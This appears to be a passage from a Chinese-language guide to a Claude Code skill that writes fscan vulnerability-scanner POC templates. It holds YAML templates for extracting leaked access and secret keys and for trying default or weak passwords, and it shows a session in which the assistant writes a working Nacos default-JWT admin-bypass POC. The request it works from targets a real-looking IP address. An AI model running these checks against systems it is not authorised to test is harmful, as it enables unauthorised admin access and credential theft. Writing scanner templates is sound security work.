### 9. Info Leak with `search` Extraction

```yaml
name: poc-yaml-vendor-product-info-leak
rules:
  - method: GET
    path: /api/v1/config
    follow_redirects: false
    search: '"secretKey":"(?P<secretKey>[^"]+)".*?"accessKey":"(?P<accessKey>[^"]+)"'
    expression: >
      response.status == 200 &&
      response.body.bcontains(b"secretKey")
detail:
  author: handle
  info: vendor product credential leak
  links:
    - https://...
```

Output when matched:
```
[+] PocScan http://10.0.0.1 poc-yaml-vendor-product-info-leak
    * accessKey: AKIAxxxxxxxx
    * secretKey: abc123...
```

### 10. Weak Password — Sets

```yaml
name: poc-yaml-vendor-product-weak
sets:
  username:
    - admin
    - administrator
  password:
    - admin
    - admin123
    - password
    - ""
rules:
  - method: GET
    path: /login
    expression: response.status == 200 && response.body.bcontains(b"Login")
  - method: POST
    path: /login
    follow_redirects: false
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: username={{username}}&password={{password}}
    expression: >
      response.status == 302 ||
      (response.status == 200 && response.body.bcontains(b"Dashboard"))
detail:
  author: handle
  login: admin/admin
  links:
    - https://...
```

### 11. Weak Password — HTTP Basic Auth

```yaml
name: poc-yaml-vendor-product-weak
rules:
  - method: GET
    path: /admin/
    expression: response.status == 401 && response.body.bcontains(b"Unauthorized")
  - method: GET
    path: /admin/
    headers:
      Authorization: Basic YWRtaW46YWRtaW4=
    expression: response.status == 200 && response.body.bcontains(b"Welcome")
detail:
  author: handle
  login: admin/admin (base64: YWRtaW46YWRtaW4=)
  links:
    - https://...
```

---

## Common Mistakes to Avoid

1. **Including Host header** — fscan sets it automatically. Never add `Host:` in rule headers.
2. **Including Content-Length** — fscan computes it. Do not include.
3. **Using `set` and `sets` together** — they are mutually exclusive.
4. **Hardcoded magic strings for RCE** — always use `randomInt` + math proof to avoid false positives.
5. **Missing `bytes()` conversion** — CEL is strictly typed. `string(rand1 + rand2)` is a string; you need `bytes(string(...))` to compare with response.body.
6. **Wrong `bcontains` argument type** — `b"literal"` creates bytes literal; `bytes("string")` converts a string variable to bytes.
7. **Path includes scheme/host** — path must start with `/`.
8. **`follow_redirects` without need** — default false is usually correct. Only set true when the exploit response is behind a redirect.

---

## `search` Field Details

- Applied to: concatenation of raw response headers + `\r\n\r\n` + response body
- Syntax: Python-style named capture groups `(?P<name>pattern)`
- All captures are:
  1. Printed to output on POC match (sorted alphabetically by key)
  2. Injected into `variableMap` for use in subsequent rules via `{{name}}`
- Empty-named groups are silently ignored
- Implementation: `WebScan/lib/check.go`, functions `executePoc` and `CheckMultiPoc`

---

## Naming Reference Table

| Vuln Type       | Suffix Convention          | Example |
|-----------------|---------------------------|---------|
| Detection       | `-detect`                  | `poc-yaml-kibana-detect` |
| Unauth          | `-unauth`                  | `poc-yaml-airflow-unauth` |
| SQL Injection   | `-sqli`                    | `poc-yaml-74cms-sqli` |
| RCE             | `-rce`                     | `poc-yaml-hotel-rce` |
| LFI             | `-lfi`                     | `poc-yaml-vendor-lfi` |
| SSRF            | `-ssrf`                    | `poc-yaml-vendor-ssrf` |
| Info Leak       | `-info-leak`               | `poc-yaml-canal-info-leak` |
| Weak Password   | `-weak` or `-default-password` | `poc-yaml-activemq-default-password` |
| CVE             | `-cve-{year}-{id}`        | `poc-yaml-spring-cve-2022-22947` |
| Auth Bypass     | `-auth-bypass`             | `poc-yaml-nacos-v1-auth-bypass` |
````

{{</details>}}

运行效果：

```text

╭─── Claude Code v2.1.63 ───────────────────────────────────────────────────────╮
│                                    │ Tips for getting started                 │
│            Welcome back!           │ Run /init to create a CLAUDE.md file wi… │
│                                    │ ──────────────────────────────────────── │
│                                    │ Recent activity                          │
│               ▐▛███▜▌              │ No recent activity                       │
│              ▝▜█████▛▘             │                                          │
│                ▘▘ ▝▝               │                                          │
│   Sonnet 4.6 · API Usage Billing   │                                          │
│          ~/Projects/fscan          │                                          │
╰───────────────────────────────────────────────────────────────────────────────╯

❯ /fscan-poc-gen

⏺ I'm ready to generate an fscan POC YAML file for you.

  Please provide one of the following:

  - A raw HTTP request (method, path, headers, body)
  - A curl command
  - A CVE number or vulnerability description
  - A payload you want to convert

  Also let me know:
  1. Vendor / Product name (if not obvious from the input)
  2. Vulnerability type if you know it: sqli, rce-blind, rce-reflect, lfi, ssrf,
  unauth, info-leak, weak-password, or detect

❯ nacos 默认jwt密钥-未授权访问

  开启了nacos.core.auth.enabled
  的情况下，如果未修改默认nacos.core.auth.default.token.secret.key的值（在Na
  cos<=2.2.0版本中，该值为默认值），则可以通过accessToken值来绕过权限。

      nacos.core.auth.default.token.secret.key=SecretKey01234567890123456789
  0123456789012345678901234567890123456789 # =后边的是默认的硬编码

  影响版本

  0.1.0<=nacos<=2.2.0
  漏洞原理

  输入正确的账号密码，则后端会返回对应该用户的加密accessToken。

  请求包

      POST /nacos/v1/auth/users/login HTTP/1.1
      Host:
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0)
  Gecko/20100101 Firefox/137.0
      Accept: application/json, text/plain, */*
      Accept-Language:
  zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
      Accept-Encoding: gzip, deflate, br
      Content-Type: application/x-www-form-urlencoded
      Content-Length: 29
      Origin: http://47.83.174.204:8848
      Connection: keep-alive
      Referer: http://47.83.174.204:8848/nacos/
      Priority: u=0

      username=nacos&password=nacos

  响应包

      HTTP/1.1 200
      Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI
  6MTc0NTY4MDYxOH0.ZLnKCsDmI768h5_ALTANhnvD0ObfSgetZj8LmUy8TjE
      Content-Type: application/json;charset=UTF-8
      Date: Sat, 26 Apr 2025 10:16:58 GMT
      Keep-Alive: timeout=60
      Connection: keep-alive
      Content-Length: 181

      {"accessToken":"eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTc0N
  TY4MDYxOH0.ZLnKCsDmI768h5_ALTANhnvD0ObfSgetZj8LmUy8TjE","tokenTtl":18000,"
  globalAdmin":true,"username":"nacos"}

⏺ Step 1 — Parsed input:
  - Method: POST
  - Path: /nacos/v1/auth/users/login
  - Content-Type: application/x-www-form-urlencoded
  - Body: username=nacos&password=nacos
  - Vendor/Product: Alibaba / Nacos
  - Vuln type: unauth (default JWT secret key + default credentials → admin
  bypass)
  - Affected: 0.1.0 <= nacos <= 2.2.0

  Attack chain:
  1. Login with default creds → extract accessToken
  2. Use token to call a privileged API endpoint → confirm admin access

  ---
  name: poc-yaml-nacos-default-jwt-unauth
  rules:
    - method: POST
      path: /nacos/v1/auth/users/login
      headers:
        Content-Type: application/x-www-form-urlencoded
      body: username=nacos&password=nacos
      search: '"accessToken":"(?P<accessToken>[^"]+)"'
      expression: response.status == 200 &&
  response.body.bcontains(b"globalAdmin\":true")
    - method: GET
      path: /nacos/v1/auth/users?pageNo=1&pageSize=9
      headers:
        Authorization: Bearer {{accessToken}}
      expression: response.status == 200 &&
  response.body.bcontains(b"\"username\"")
  detail:
    author: your-handle
    description: |
      Nacos uses a hardcoded default JWT secret key
      (SecretKey012345678901234567890123456789012345678901234567890123456789).
      When auth is enabled but the key is not rotated, default credentials
      (nacos/nacos) produce a valid admin token that bypasses authorization.
    links:
      - https://github.com/alibaba/nacos/issues/9175
      - https://github.com/alibaba/nacos/issues/4593

  Suggested filename: nacos-default-jwt-unauth.yml

  ---
  How the chain works:

  ┌──────┬────────────────────────────────────────────────────────────────────┐
  │ Rule │                              Purpose                               │
  ├──────┼────────────────────────────────────────────────────────────────────┤
  │      │ POST login → search captures accessToken into variableMap;         │
  │ 1    │ expression checks globalAdmin:true confirms admin-level token was  │
  │      │ issued                                                             │
  ├──────┼────────────────────────────────────────────────────────────────────┤
  │ 2    │ GET privileged user-list API with Bearer {{accessToken}} → success │
  │      │  confirms full admin access via the default JWT key                │
  └──────┴────────────────────────────────────────────────────────────────────┘

  To embed in fscan binary:
  cp nacos-default-jwt-unauth.yml WebScan/pocs/
  go build -o fscan main.go

  POC files are embedded at compile time via //go:embed pocs.


✻ Sautéed for 40s
```

### 从 payload 生成 nuclei 模板

### 从 nuclei 模板生成 fscan poc yaml